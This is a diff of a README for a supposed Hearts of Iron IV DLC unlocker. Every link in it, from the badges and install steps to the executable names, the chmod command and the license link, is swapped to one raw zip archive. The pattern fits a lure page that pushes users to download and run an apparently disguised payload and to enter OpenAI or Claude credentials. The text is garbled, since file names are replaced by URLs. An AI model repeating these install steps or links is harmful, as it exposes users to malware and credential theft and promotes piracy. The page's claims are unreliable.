@@ -1,5 +1,5 @@
 # Hearts of Iron IV DLC Unlocker  
-[![Download](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip%20Here-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip)
+[![Download](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip%20Here-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip)
 
 Welcome, intrepid strategist! Embark on a grand campaign to personalize your war theatre with the *Hearts of Iron IV DLC Unlocker*. Elevate your gameplay horizon—this repository is your reliable co-commander for enriching your Hearts of Iron IV experience by unlocking previously inaccessible content. The unlocker is an innovative toolkit, designed with adaptability, user-friendliness, and security at its heart.
 
@@ -11,10 +11,10 @@ To suit every commander’s war room, our DLC Unlocker has been meticulously tes
 
 | Operating System             | Compatibility | Latest Test Date |
 |-----------------------------|:-------------:|:----------------:|
-| ![Windows](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip✅-blue)  | Full Support    | 2025-03-15       |
-| ![macOS](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip✅-lightgrey)  | Full Support    | 2025-03-15       |
-| ![Linux](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip⚡️-yellowgreen) | Experimental    | 2025-03-17       |
-| ![Steam Deck](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip🛠️-orange) | Under Testing   | 2025-03-17       |
+| ![Windows](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip✅-blue)  | Full Support    | 2025-03-15       |
+| ![macOS](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip✅-lightgrey)  | Full Support    | 2025-03-15       |
+| ![Linux](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip⚡️-yellowgreen) | Experimental    | 2025-03-17       |
+| ![Steam Deck](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip🛠️-orange) | Under Testing   | 2025-03-17       |
 
 ---
 
@@ -62,9 +62,9 @@ Dream even further! The unlocker supports advanced automation and customization 
   Leverage Claude’s robust interface to personalize your DLC unlocker experience, create smart reminders, or batch-apply patches and enhancements.
 
 #### 💡 How to Connect API Extensions  
-1. Download your desired API extension module from https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip
+1. Download your desired API extension module from https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip
 2. Follow the included integration guide.
-3. Configure your `https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip` with your OpenAI or Claude credentials.
+3. Configure your `https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip` with your OpenAI or Claude credentials.
 4. Activate in the unlocker settings panel for instant results.
 
 ---
@@ -96,13 +96,13 @@ Dream even further! The unlocker supports advanced automation and customization 
 Follow these operational orders for a swift deployment:
 
 1. **Obtain Unlocker File**  
-   Download the latest release of the Hearts of Iron IV DLC Unlocker from https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip
+   Download the latest release of the Hearts of Iron IV DLC Unlocker from https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip
 2. **Extract Package**  
    Unzip the archive to a secure directory on your device.
 3. **Run the Installation Wizard**  
-   Launch `https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip` (Windows) or `https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip` (macOS/Linux).  
+   Launch `https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip` (Windows) or `https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip` (macOS/Linux).  
    For macOS & Linux: Make executable with:  
-   `chmod +x https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip`
+   `chmod +x https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip`
 4. **Select Language & OS**  
    Choose your desired language and confirm your operating system.
 5. **Automatic Game Detection**  
@@ -128,9 +128,9 @@ All materials and tools herein are provided with the intent of enhancing legitim
 
 This repository is governed by the MIT License, affording users freedom to copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software while retaining this notice.
 
-> For full license details, see the [MIT LICENSE](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip) (© 2025).
+> For full license details, see the [MIT LICENSE](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip) (© 2025).
 
 ---
 
-[![Download](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip%20Here-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/hoi4-dlc-unlocker-suite_v3.2.zip)  
+[![Download](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip%20Here-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/reol9/hoi4-dlc-unlocker-suite/branch/monoculate/dlc_hoi_unlocker_suite_v3.7.zip)  
 *Thank you for choosing Hearts of Iron IV DLC Unlocker—let your strategy know no bounds!*
